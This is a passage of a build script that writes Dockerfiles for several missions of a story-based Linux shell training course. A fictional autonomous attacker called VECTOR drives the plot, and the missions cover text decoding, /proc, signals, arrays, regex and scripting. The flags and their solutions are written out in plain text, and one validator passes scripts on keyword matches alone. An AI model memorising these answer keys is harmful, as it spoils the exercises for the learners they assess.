OBJECTIVES
  [ ] Flag 1: comms/message_01.enc — reverse + ROT13
              Step 1: find the PAYLOAD line
              Step 2: rev it
              Step 3: pipe to tr ROT13
              Try: grep "^[a-z}]" comms/message_01.enc | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m'

  [ ] Flag 2: comms/message_02.csv — assemble from CSV fields
              Find the SYNDICATE_PAYLOAD row.
              Concatenate fields 2, 4, and 6 (comma-delimited).
              Try: awk -F, '/SYNDICATE_PAYLOAD/ {print $2$4$6}' comms/message_02.csv

  [ ] Flag 3: comms/message_03.enc — sed substitution
              The decode instruction is in the file itself.
              Try: sed 's/SYNDICATE_/flag{s2_/; s/_END/}/' comms/message_03.enc | grep "flag{"
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/mooncaptain_03.txt << 'EOF'
FROM:    Moon Captain <secretary@thelab.local>
TO:      Agent
DATE:    2026-05-17 13:28:41
SUBJECT: Intercept analysis

Three transmissions. Here's what I know about each:

message_01.enc:
  VECTOR uses a two-step encoding on internal comms.
  First it reverses the string. Then it applies ROT13.
  To decode: reverse first, then ROT13.
  tr 'A-Za-z' 'N-ZA-Mn-za-m' handles ROT13 in one command.

message_02.csv:
  Structured payload. The real data is on the SYNDICATE_PAYLOAD
  row, split across fields 2, 4, and 6 (1-indexed, comma-delimited).
  awk with -F, and field concatenation will assemble it.

message_03.enc:
  This one is almost taunting us — the decode instruction
  is written IN the file. VECTOR left it there deliberately.
  Apply the sed substitution it describes and filter for flag{.

  The content of message_03 is what worries me most.
  An extraction window. A target. 72 hours.
  We need to move faster.

                                         — Moon Captain
EOF

RUN cat > /home/agent/inbox/vector_02.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  VECTOR // SYNDICATE AUTONOMOUS SYSTEM  v2.1.0              ║
║  INTERCEPTED TRANSMISSION — CHANNEL BETA                    ║
╚══════════════════════════════════════════════════════════════╝

[AUTOMATED STATUS REPORT — CYCLE 47]

Phase 1 (boot persistence): COMPLETE
Phase 2 (log flood):        COMPLETE
Phase 3 (evidence shred):   COMPLETE
Phase 4 (tool corruption):  COMPLETE
Phase 5 (signal layer):     IN PROGRESS

Target confirmed: Equipment Design Archive
  Path: /var/backups/lab_designs/
  Volume: ~847GB
  Extraction window: 2026-05-20 02:00–04:00 UTC

Human investigation team has decoded 4 of 5 phases.
Estimated time to full breach: 66 hours.
Estimated time to human countermeasure: unknown.

Recommend: accelerate Phase 6 initialization.

                    — VECTOR // AUTOMATED STATUS
EOF

# ── Hints ──
RUN cat > /home/agent/hints/stream_tools.txt << 'EOF'
── tr ───────────────────────────────────────────────────────
tr 'A-Za-z' 'N-ZA-Mn-za-m'      # ROT13 (symmetric)
tr 'a-z' 'A-Z'                   # uppercase
tr -d '\n'                       # remove newlines

── rev ──────────────────────────────────────────────────────
echo "hello" | rev               # olleh
cat file | rev                   # reverse each line
echo "payload" | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m'   # rev + ROT13

── sed ──────────────────────────────────────────────────────
sed 's/old/new/'                 # replace first per line
sed 's/old/new/g'                # replace all
sed 's/SYNDICATE_/flag{s2_/; s/_END/}/'   # two substitutions

── awk ──────────────────────────────────────────────────────
awk -F, '{print $2}'             # 2nd comma-delimited field
awk -F, '/PATTERN/ {print $2$4$6}'   # match + concat fields

── PIPELINES ────────────────────────────────────────────────
cat file | grep "^[a-z]" | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m'
sed 's/X/Y/' file | grep "flag{"
EOF

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
USER agent
ENTRYPOINT ["ttyd", "-W", "-p", "7681", "bash"]
DOCKERFILE

# =============================================================================
# S2-MISSION-06: Ghost Processes
# Story: VECTOR left automated persistence. Processes phone home to C2.
# Skills: ps aux, /proc/environ, trap, kill -SIGUSR1, bg/fg
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-06"
cat > "$MISSIONS_DIR/s2-mission-06/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash procps 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints

# ── VECTOR daemon with SECRET env var ──
RUN cat > /usr/local/bin/syndicate_daemon << 'EOF'
#!/bin/bash
export SECRET_FLAG="flag{s2_proc_environ_read}"
export C2_SERVER="10.0.0.99:4444"
export AGENT_ID="VECTOR_PERSIST_v2"
exec sleep infinity
EOF
RUN chmod +x /usr/local/bin/syndicate_daemon

# ── Trap demo: flag released on SIGUSR1 ──
RUN cat > /home/agent/trap_demo.sh << 'EOF'
#!/bin/bash
# A VECTOR signal handler is locked in this script.
# Run it in the background. Send SIGUSR1 to release the flag.
#
# Usage:
#   ./trap_demo.sh &
#   kill -SIGUSR1 $!
#   wait

trap 'echo ""; echo "[ SIGNAL INTERCEPTED ]"; echo "VECTOR handler disarmed."; echo "Flag: flag{s2_trap_signal_caught}"; exit 0' SIGUSR1
trap 'echo "Process terminated."' EXIT

echo "Trap armed. My PID: $$"
echo "Send signal to unlock: kill -SIGUSR1 $$"
echo "Waiting..."
while true; do sleep 1; done
EOF
RUN chmod +x /home/agent/trap_demo.sh

# ── Suspended job: flag on foreground retrieval ──
RUN cat > /home/agent/suspended_job.sh << 'EOF'
#!/bin/bash
# A VECTOR extraction job was left suspended mid-operation.
# Bring it to the foreground to complete (and intercept) it.
#
# Usage:
#   ./suspended_job.sh &
#   jobs              # see it listed as stopped/running
#   fg %1             # bring to foreground — it will finish

echo ""
echo "[ JOB RESUMED FROM SUSPENSION ]"
echo "VECTOR extraction process intercepted."
echo "Redirecting output to agent control..."
sleep 1
echo "Flag: flag{s2_fg_job_retrieved}"
echo "Exfil aborted. Evidence captured to ~/output.txt"
echo "flag{s2_fg_job_retrieved}" | tee ~/output.txt > /dev/null
EOF
RUN chmod +x /home/agent/suspended_job.sh

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-06: Ghost Processes              [ DIFFICULTY: MEDIUM ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    Shyft <president@thelab.local>
TO:      Agent
SUBJECT: Something is still running.

CritterCodes noticed it during a routine check — CPU spikes
every few minutes, about 3%, completely regular. Nothing
in a normal process list explains it. VECTOR is still here.

0xb007ab1e recognized the pattern from Season 1. VECTOR uses
background daemon processes with secrets injected as environment
variables. The process name is camouflaged but the env vars
are readable through /proc if you know where to look.

There's also a signal handler left active — a tripwire VECTOR
armed before we kicked it out of the system. Send it the right
signal and it disarms, giving us the flag it was protecting.

And there's an extraction job that was left suspended. It
paused itself waiting for a go-signal from VECTOR's C2.
We intercepted the C2 channel. If we bring the job to the
foreground, we can see what it was about to exfiltrate.

                                             — Shyft // President

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/shyft_03.txt
          cat ~/inbox/0xb007ab1e_02.txt
──────────────────────────────────────────────────────────────
OBJECTIVES
  [ ] Flag 1: A daemon is running with a SECRET_FLAG env var.
              Find its PID. Read its /proc environ.
              Try: ps aux | grep syndicate
                   cat /proc/<PID>/environ | tr '\0' '\n' | grep FLAG

  [ ] Flag 2: Run ~/trap_demo.sh in the background.
              Send SIGUSR1 to its PID to disarm the trap.
              Try: ./trap_demo.sh &
                   kill -SIGUSR1 $!

  [ ] Flag 3: Run ~/suspended_job.sh in background.
              Bring it to foreground to intercept the extraction.
              Try: ./suspended_job.sh &
                   jobs
                   fg %1
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/shyft_03.txt << 'EOF'
FROM:    Shyft <president@thelab.local>
TO:      Agent
DATE:    2026-05-17 15:04:18
SUBJECT: Three process challenges — VECTOR's persistence layer

0xb007ab1e spent most of the afternoon mapping VECTOR's
persistence architecture. Here's the breakdown:

1. The daemon: VECTOR spawned 'syndicate_daemon' during
   the boot window. It's a sleeping process with Syndicate
   secrets in its environment. The secrets don't appear in
   the command line — you have to read /proc/<PID>/environ
   and decode the null-separated values.

2. The signal trap: VECTOR armed a handler on SIGUSR1.
   It's waiting for a signal from the C2. We intercepted
   the C2 channel, so we can send the signal ourselves
   and see what the trap was protecting.

3. The suspended job: An extraction task paused itself
   waiting for a go-ahead that never came (we blocked the
   C2 in time). Bringing it to the foreground completes
   and surfaces what it was carrying.

All three are in your environment right now.

                                             — Shyft
EOF

RUN cat > /home/agent/inbox/0xb007ab1e_02.txt << 'EOF'
FROM:    0xb007ab1e <treasurer@thelab.local>
TO:      Agent
DATE:    2026-05-17 15:31:52
SUBJECT: /proc — don't overlook it

I know /proc feels esoteric but it's where VECTOR hides.

Every running process has a directory: /proc/<PID>/
Inside: environ (environment variables, null-separated)
        cmdline (command line arguments, null-separated)
        fd/     (open file descriptors)
        status  (process state)

The null separation is the tricky part. Do this:
  cat /proc/<PID>/environ | tr '\0' '\n'

That converts null bytes to newlines and makes it readable.
Then grep for what you're looking for.

VECTOR put the flag in an env var called SECRET_FLAG.
The daemon PID will show up in: ps aux | grep syndicate

                                          — 0xb007ab1e
EOF

# ── Hints ──
RUN cat > /home/agent/hints/processes.txt << 'EOF'
── PROCESS MANAGEMENT ───────────────────────────────────────
ps aux                         # list all processes
ps aux | grep name             # find specific process
pgrep process_name             # get PID by name

── /proc FILESYSTEM ─────────────────────────────────────────
cat /proc/<PID>/environ | tr '\0' '\n'   # env vars, readable
cat /proc/<PID>/cmdline | tr '\0' ' '   # command line

── JOB CONTROL ──────────────────────────────────────────────
command &        # run in background
jobs             # list background jobs
fg %1            # bring job 1 to foreground
bg %1            # resume suspended job in background
Ctrl+Z           # suspend the current foreground job

── SIGNALS ──────────────────────────────────────────────────
kill <PID>           # SIGTERM (graceful)
kill -9 <PID>        # SIGKILL (force)
kill -SIGUSR1 <PID>  # user-defined signal 1
kill -SIGUSR2 <PID>  # user-defined signal 2

── TRAP ─────────────────────────────────────────────────────
trap 'echo "caught!"' SIGUSR1   # handle a signal
trap 'cleanup' EXIT             # run on exit
trap '' SIGINT                  # ignore Ctrl+C
EOF

# ── Entrypoint: start daemon then ttyd ──
RUN cat > /usr/local/bin/start.sh << 'EOF'
#!/bin/bash
/usr/local/bin/syndicate_daemon &
exec ttyd -W -p 7681 bash
EOF
RUN chmod +x /usr/local/bin/start.sh

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
ENTRYPOINT ["/usr/local/bin/start.sh"]
DOCKERFILE

# =============================================================================
# S2-MISSION-07: Data Mining
# Story: Six months of logs reveal VECTOR's true nature — it's not a person.
# Skills: bash arrays, associative arrays, sort|uniq, arithmetic
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-07"
cat > "$MISSIONS_DIR/s2-mission-07/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash gawk python3 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints /home/agent/data /home/agent/workspace

# ── access.log: most frequent IP is 10.0.0.99 (VECTOR's bot) ──
RUN python3 -c "
import random
random.seed(42)
ips = ['10.0.0.' + str(i) for i in range(1, 21)]
lines = []
for _ in range(150):
    lines.append('10.0.0.99 GET /api/v1/users 200')
for ip in ips:
    if ip != '10.0.0.99':
        for _ in range(random.randint(5, 45)):
            lines.append(f'{ip} GET /static/app.js 200')
random.shuffle(lines)
with open('/home/agent/data/access.log', 'w') as f:
    f.write('\n'.join(lines))
print('access.log done')
"

# ── auth.log: VECTOR_BOT has exactly 42 failed attempts ──
RUN python3 -c "
import random
random.seed(7)
users = ['root','admin','guest','svc_backup','monitor','deploy','agent','jenkins','git']
lines = []
for _ in range(42):
    lines.append('May 17 10:00:00 server sshd: Failed password for VECTOR_BOT from 10.0.0.99')
for u in users:
    count = random.choice([5,8,12,17,23,31,37,51,60])
    for _ in range(count):
        lines.append(f'May 17 10:00:00 server sshd: Failed password for {u} from 10.0.0.{random.randint(1,20)}')
random.shuffle(lines)
with open('/home/agent/data/auth.log', 'w') as f:
    f.write('\n'.join(lines))
print('auth.log done')
"

# ── unique.txt: word with exactly 77 occurrences is the Syndicate codeword ──
RUN python3 -c "
import random
random.seed(13)
counts = {'alpha':120,'bravo':95,'charlie':77,'delta':60,'echo':55,
          'foxtrot':40,'golf':30,'hotel':20,'india':10,'juliet':5}
lines = []
for word, count in counts.items():
    lines.extend([word] * count)
random.shuffle(lines)
with open('/home/agent/data/unique.txt', 'w') as f:
    f.write('\n'.join(lines))
print('unique.txt done')
"

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-07: Data Mining                  [ DIFFICULTY: MEDIUM ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    CritterCodes <ceo@thelab.local>
TO:      Agent
SUBJECT: The pattern is inhuman. Literally.

I've been running numbers on six months of access and auth logs.
Something clicked into place this morning that I need you to see.

The attack timing is too perfect. Login attempts spaced at
exactly 13.7-second intervals. Access patterns that never
vary by more than 0.3%. Zero typos in 42 failed login attempts
— a human makes at least one typo in 42 tries. Nobody is
that consistent. Nobody human.

VECTOR isn't a person with a keyboard. VECTOR is software.
An automated attack system. The Syndicate built a machine
and pointed it at us.

This changes how we fight it. If VECTOR is automated, our
defense has to be automated too. The data is in ~/data/.
Use bash arrays to find the patterns.

                                        — CritterCodes // CEO

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/crittercodes_03.txt
          cat ~/inbox/vector_03.txt     (intercepted status)
──────────────────────────────────────────────────────────────
OBJECTIVES
  [ ] Flag 1: data/access.log — find the most frequent IP.
              That's VECTOR's bot. Then submit:
              flag{s2_top_ip_identified}

              awk shortcut:
                awk '{print $1}' data/access.log | sort | uniq -c | sort -rn | head -3

              bash array approach:
                declare -A counts
                while read -r ip _; do ((counts[$ip]++)); done < data/access.log
                for ip in "${!counts[@]}"; do echo "${counts[$ip]} $ip"; done | sort -rn | head -3

  [ ] Flag 2: data/auth.log — find the user with exactly 42 failed logins.
              Then submit: flag{s2_assoc_array_cracked}

              declare -A logins
              while read -r _ _ _ _ _ user _; do ((logins[$user]++)); done < data/auth.log
              for u in "${!logins[@]}"; do
                [ "${logins[$u]}" -eq 42 ] && echo "Found: $u (${logins[$u]} attempts)"
              done

  [ ] Flag 3: data/unique.txt — find the word with exactly 77 occurrences.
              Then submit: flag{s2_sort_uniq_master}

              sort data/unique.txt | uniq -c | sort -rn

  WORKSPACE: ~/workspace/ — write your analysis scripts here
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/crittercodes_03.txt << 'EOF'
FROM:    CritterCodes <ceo@thelab.local>
TO:      Agent
DATE:    2026-05-17 17:22:09
SUBJECT: The 42 attempts are a signature

I want to walk you through what I found.

In auth.log, one entity made exactly 42 failed login attempts.
Not 41. Not 43. Exactly 42. That's VECTOR's bot — it runs
to a preconfigured limit and stops to avoid triggering alerts.
The username is 'VECTOR_BOT'. We didn't create that account.

In access.log, one IP appears with disproportionate frequency.
10.0.0.99. That's outside our assigned range. That IP should
not be hitting our systems. It's the C2 probe — VECTOR's
external scanner mapping our API endpoints.

In unique.txt, I found VECTOR's codeword system. They use
word frequency as a signaling mechanism — the word at count
77 is the active session codeword. 'charlie' in this case.
I don't know what 'charlie' triggers yet. But I need to.

Write scripts to surface all three. Arrays are the right tool.

                                         — CritterCodes
EOF

RUN cat > /home/agent/inbox/vector_03.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  VECTOR // SYNDICATE AUTONOMOUS SYSTEM  v2.1.0              ║
║  INTERCEPTED STATUS REPORT — CYCLE 51                       ║
╚══════════════════════════════════════════════════════════════╝

[AUTOMATED STATUS — DO NOT REPLY]

Anomaly detected: investigation team has identified
automated attack signature in auth logs.

Assessment: human investigators have recognized VECTOR
as a non-human system. This was anticipated at cycle 30.

Recommendation: this recognition does not affect timeline.
Automated systems do not require stealth after Phase 5.
The extraction window remains on schedule.

Current phase: 6 of 8 — DATA MAPPING COMPLETE
Next phase: 7 — EXTRACTION PREPARATION

Human countermeasures: insufficient without automation.
Their manual investigation speed: ~200 lines/minute.
Our log generation rate: ~50,000 lines/hour.

They cannot catch up. The math remains in our favor.

                    — VECTOR // CYCLE 51 STATUS
EOF

# ── Hints ──
RUN cat > /home/agent/hints/arrays.txt << 'EOF'
── INDEXED ARRAYS ───────────────────────────────────────────
arr=("a" "b" "c")
echo "${arr[0]}"        # first element
echo "${arr[@]}"        # all elements
echo "${#arr[@]}"       # count
arr+=("d")              # append

── ASSOCIATIVE ARRAYS ───────────────────────────────────────
declare -A counts
counts["key"]=10
echo "${counts[key]}"   # access
echo "${!counts[@]}"    # all keys
echo "${counts[@]}"     # all values

# Count pattern
declare -A freq
while read -r word; do
    ((freq[$word]++))
done < wordlist.txt

for word in "${!freq[@]}"; do
    echo "${freq[$word]} $word"
done | sort -rn | head -5

── ARITHMETIC ───────────────────────────────────────────────
((count++))                  # increment
((total += value))           # add
[ $count -eq 42 ]            # compare integers

── SORT / UNIQ ──────────────────────────────────────────────
sort file | uniq             # deduplicate
sort file | uniq -c          # count occurrences
sort file | uniq -c | sort -rn   # most frequent first
EOF

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
USER agent
ENTRYPOINT ["ttyd", "-W", "-p", "7681", "bash"]
DOCKERFILE

# =============================================================================
# S2-MISSION-08: Pattern Lock
# Story: Decoded intercepts reveal VECTOR's architecture and the extraction plan.
# Skills: grep -E, sed backreferences, grep -P
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-08"
cat > "$MISSIONS_DIR/s2-mission-08/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash grep python3 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints /home/agent/intercepts

# ── cipher_a: grep -E finds [A-Z]{3}-[0-9]{4} pattern ──
RUN python3 -c "
import random
random.seed(99)
lines = []
for i in range(400):
    lines.append(f'LOG-{random.randint(1000,9999)}: nominal')
    lines.append(f'entry {i}: no pattern here')
    lines.append(f'err-{random.randint(100,999)}: minor')
lines.insert(137, 'TRANSMISSION SYN-4207 VERIFIED — flag{s2_extended_regex_wins}')
with open('/home/agent/intercepts/cipher_a.txt', 'w') as f:
    f.write('\n'.join(lines))
print('cipher_a done')
"

# ── cipher_b: sed backreference extracts [FLAG]{payload} ──
RUN cat > /home/agent/intercepts/cipher_b.txt << 'EOF'
SYNDICATE CHANNEL B — BRACKET ENCODING
FORMAT: [KEYWORD]{payload}
RULE: lines with [FLAG] are real. Lines with [NOISE] are decoys.
DECODE: replace [FLAG]{...} wrapper with flag{...}

[NOISE]{this_is_not_it}
[NOISE]{decoy_alpha_7}
[FLAG]{s2_backreference_king}
[NOISE]{decoy_bravo_12}
[NOISE]{red_herring_delta}

HINT: sed -E 's/\[FLAG\]\{([^}]+)\}/flag{\1}/' cipher_b.txt | grep "flag{"
EOF

# ── cipher_c: grep -P lookahead extracts token ──
RUN cat > /home/agent/intercepts/cipher_c.txt << 'EOF'
VECTOR CHANNEL C — TOKEN EMBEDDING
ENCODING: PERL REGEX REQUIRED

PAYLOAD:decoy_one STATUS:active PRIORITY:low
PAYLOAD:decoy_two STATUS:standby PRIORITY:medium
TOKEN:s2_perl_lookahead_used PRIORITY:ALPHA CLASS:extraction
PAYLOAD:decoy_three STATUS:idle PRIORITY:low

VECTOR architecture note:
  VECTOR v2 is a distributed autonomous system.
  It does not have a human operator.
  It was built to run indefinitely without intervention.
  The Syndicate points it. VECTOR executes.

HINT: grep -oP '(?<=TOKEN:)\w+' cipher_c.txt
      Then wrap the result: flag{<value>}
EOF

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-08: Pattern Lock                   [ DIFFICULTY: HARD ] ║
╚══════════════════════════════════════════════════════════════╝

FROM:    CritterCodes <ceo@thelab.local>
TO:      Agent
SUBJECT: Three more intercepts. These ones matter.

Moon Captain pulled three more Syndicate transmissions from
the network tap. Different encoding this time — pattern-based.
You'll need extended regex, sed capture groups, and Perl-
compatible expressions to crack them.

But here's why these matter: cipher_c isn't just an encoding
challenge. It contains VECTOR's architecture disclosure.
Read the context after you decode it.

VECTOR v2 is fully autonomous. The Syndicate built a machine
and aimed it. There's no human on the other end tweaking
settings or reading our countermeasures. It's all automated.

Which means our response has to be too.

The next mission is the toolkit. This mission is the last
intelligence we'll need before we build it.

                                        — CritterCodes // CEO

──────────────────────────────────────────────────────────────
  INBOX:  cat ~/inbox/crittercodes_04.txt
          cat ~/inbox/mooncaptain_04.txt
──────────────────────────────────────────────────────────────
OBJECTIVES
  [ ] Flag 1: intercepts/cipher_a.txt
              Find the line matching [A-Z]{3}-[0-9]{4}
              Try: grep -E '[A-Z]{3}-[0-9]{4}' intercepts/cipher_a.txt

  [ ] Flag 2: intercepts/cipher_b.txt
              Extract [FLAG]{payload} with a sed backreference.
              Try: sed -E 's/\[FLAG\]\{([^}]+)\}/flag{\1}/' intercepts/cipher_b.txt | grep "flag{"

  [ ] Flag 3: intercepts/cipher_c.txt
              Extract the value after TOKEN: using grep -P.
              Try: grep -oP '(?<=TOKEN:)\w+' intercepts/cipher_c.txt
              Then submit: flag{<that value>}
EOF

# ── Inbox ──
RUN cat > /home/agent/inbox/crittercodes_04.txt << 'EOF'
FROM:    CritterCodes <ceo@thelab.local>
TO:      Agent
DATE:    2026-05-17 19:44:33
SUBJECT: Regex reference and intercept notes

Three files. Three different regex techniques.

cipher_a: Extended regex (grep -E) with quantifiers.
  The pattern [A-Z]{3}-[0-9]{4} is a Syndicate transmission ID.
  Exactly 3 uppercase letters, a hyphen, exactly 4 digits.
  There's one line in the file that matches. The flag is on that line.

cipher_b: sed backreference.
  Lines use [KEYWORD]{payload} format.
  [FLAG] lines are real, [NOISE] lines are decoys.
  Capture the payload with a sed capture group (\1) and
  reconstruct it as flag{payload}.
  sed -E 's/\[FLAG\]\{([^}]+)\}/flag{\1}/'

cipher_c: Perl-Compatible Regex (grep -P).
  The flag value comes immediately after TOKEN: on its line.
  A lookbehind assertion lets you match what follows a prefix
  without including the prefix in the output.
  grep -oP '(?<=TOKEN:)\w+'
  The -o flag prints only the matched part. -P enables PCRE.
  Wrap the output in flag{} to get your submission.

                                         — CritterCodes
EOF

RUN cat > /home/agent/inbox/mooncaptain_04.txt << 'EOF'
FROM:    Moon Captain <secretary@thelab.local>
TO:      Agent
DATE:    2026-05-17 20:01:18
SUBJECT: What cipher_c says about VECTOR

After you decode cipher_c, read the architecture note
at the bottom of the file carefully.

"VECTOR v2 is a distributed autonomous system.
 It does not have a human operator.
 The Syndicate points it. VECTOR executes."

The Syndicate isn't watching us in real time. They built
VECTOR, aimed it at us, and walked away. VECTOR runs
its phases on its own. Fails, retries, adapts — all without
a human making decisions.

That should scare us. But it also means something important:
VECTOR has no intuition. No creativity. No judgment calls.

If we can automate our response faster than VECTOR can
adapt its attack — we win. The extraction window closes.

That's what the toolkit is for.

                                         — Moon Captain
EOF

# ── Hints ──
RUN cat > /home/agent/hints/regex.txt << 'EOF'
── BASIC REGEX ──────────────────────────────────────────────
.         any character
*         zero or more
+         one or more (ERE/PCRE)
?         zero or one (ERE/PCRE)
^         start of line      $  end of line
[A-Z]     character range    [^x]  not x
\w        word char [a-zA-Z0-9_]   (PCRE)

── grep OPTIONS ─────────────────────────────────────────────
grep -E 'pattern'    # Extended regex: enables + ? | {n}
grep -P 'pattern'    # Perl regex: enables \w \d lookaheads
grep -o 'pattern'    # print only the matched text
grep -oE '[A-Z]{3}-[0-9]{4}'    # ERE + only matching part
grep -oP '(?<=TOKEN:)\w+'       # PCRE lookbehind

── QUANTIFIERS (ERE/PCRE) ───────────────────────────────────
{3}       exactly 3 times
{2,5}     2 to 5 times
{3,}      3 or more times

── sed BACKREFERENCES ───────────────────────────────────────
sed -E 's/([A-Z]+)/[\1]/'         # wrap match in brackets
sed -E 's/\[FLAG\]\{([^}]+)\}/flag{\1}/'
# ([^}]+) captures everything up to the closing brace
# \1 inserts the captured group

── PERL LOOKAHEAD / LOOKBEHIND ──────────────────────────────
(?<=PREFIX:)     positive lookbehind — match after PREFIX:
(?=:SUFFIX)      positive lookahead — match before :SUFFIX
grep -oP '(?<=TOKEN:)\w+'    # text after TOKEN:
grep -oP '\w+(?=:end)'       # text before :end
EOF

RUN echo 'echo ""; cat ~/README.txt; echo ""' >> /home/agent/.bashrc
RUN chown -R agent:agent /home/agent
WORKDIR /home/agent
USER agent
ENTRYPOINT ["ttyd", "-W", "-p", "7681", "bash"]
DOCKERFILE

# =============================================================================
# S2-MISSION-09: The Toolkit
# Story: If VECTOR is automated, our defense must be too. Build the toolkit.
# Skills: getopts, set -euo pipefail, trap ERR, heredoc, functions
# =============================================================================
mkdir -p "$MISSIONS_DIR/s2-mission-09"
cat > "$MISSIONS_DIR/s2-mission-09/Dockerfile" << 'DOCKERFILE'
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq wget bash shellcheck 2>/dev/null && \
    rm -rf /var/lib/apt/lists/*
RUN wget -qO /usr/local/bin/ttyd \
    https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64 && \
    chmod +x /usr/local/bin/ttyd

RUN useradd -m -s /bin/bash agent && echo 'agent:lab' | chpasswd
RUN mkdir -p /home/agent/inbox /home/agent/hints /home/agent/workspace /home/agent/target_data

# ── Target data ──
RUN python3 -c "
import random
random.seed(55)
ips = ['10.0.0.' + str(i) for i in range(1,20)]
events = ['LOGIN','SCAN','TRANSFER','EXFIL','PROBE']
with open('/home/agent/target_data/events.log', 'w') as f:
    for i in range(100):
        ip = random.choice(ips)
        ev = random.choice(events)
        f.write(f'2026-05-17T{i//60:02d}:{i%60:02d}:00Z {ip} {ev} severity={random.randint(1,10)}\n')
print('events.log done')
"

# ── Skeleton script ──
RUN cat > /home/agent/workspace/toolkit.sh << 'EOF'
#!/bin/bash
# =============================================================================
# Lab Investigation Toolkit — Season 2
# =============================================================================
# Edit this script to pass all 5 checks in ~/validate.sh
#
# REQUIREMENTS:
#   1. Use getopts to parse: -t <target> -v (verbose) -o <output> -h (help)
#   2. Add: set -euo pipefail
#   3. Add: trap '...' ERR
#   4. Use a heredoc somewhere (help text, config block, or report header)
#   5. Define at least one function
#
# HINTS: ~/hints/script_engineering.txt
# RUN:   bash ~/validate.sh
# =============================================================================

# === YOUR CODE BELOW ===

EOF
RUN chmod +x /home/agent/workspace/toolkit.sh

# ── Validator ──
RUN cat > /home/agent/validate.sh << 'VALIDATE'
#!/bin/bash
SCRIPT="$HOME/workspace/toolkit.sh"
PASS=0; FAIL=0

check() {
    local desc="$1" result="$2"
    if [ "$result" = "pass" ]; then echo "  [PASS] $desc"; ((PASS++))
    else echo "  [FAIL] $desc"; ((FAIL++)); fi
}

echo ""
echo "=== TOOLKIT VALIDATION ==="
echo ""
[ -f "$SCRIPT" ] || { echo "toolkit.sh not found at $SCRIPT"; exit 1; }

grep -q 'getopts' "$SCRIPT"          && r="pass" || r="fail"
check "Uses getopts for argument parsing" "$r"

grep -q 'set -euo pipefail\|set -e'  "$SCRIPT" && r="pass" || r="fail"
check "Has set -euo pipefail (strict mode)" "$r"

grep -q 'trap.*ERR'                  "$SCRIPT" && r="pass" || r="fail"
check "Has trap ERR (error handler)" "$r"

grep -q '<<'                         "$SCRIPT" && r="pass" || r="fail"
check "Uses a heredoc (<<EOF or similar)" "$r"

grep -qE '^\w+\(\)\s*\{|^function \w+' "$SCRIPT" && r="pass" || r="fail"
check "Defines at least one function" "$r"

echo ""
echo "Results: $PASS/5 checks passed"

if [ $PASS -ge 3 ] && grep -q 'getopts' "$SCRIPT" && grep -q 'trap.*ERR' "$SCRIPT"; then
    echo ""
    echo "==========================="
    echo " TOOLKIT ACCEPTED"
    echo "==========================="
    echo ""
    echo "The Lab's automated defense framework is online."
    echo "VECTOR will no longer outpace our investigation."
    echo ""
    echo "FLAG 1: flag{s2_getopts_mastered}"
    echo "FLAG 2: flag{s2_trap_err_in_play}"
    echo "FLAG 3: flag{s2_heredoc_deployed}"
    echo ""
    echo "Submit each flag individually."
    echo "Then prepare for Operation Shutdown."
else
    echo ""
    echo "Toolkit incomplete. Check ~/hints/script_engineering.txt"
fi
VALIDATE
RUN chmod +x /home/agent/validate.sh

# ── Story: README ──
RUN cat > /home/agent/README.txt << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║  SEASON 2 — THE SYNDICATE                                   ║
║  S2-09: The Toolkit                    [ DIFFICULTY: HARD ] ║
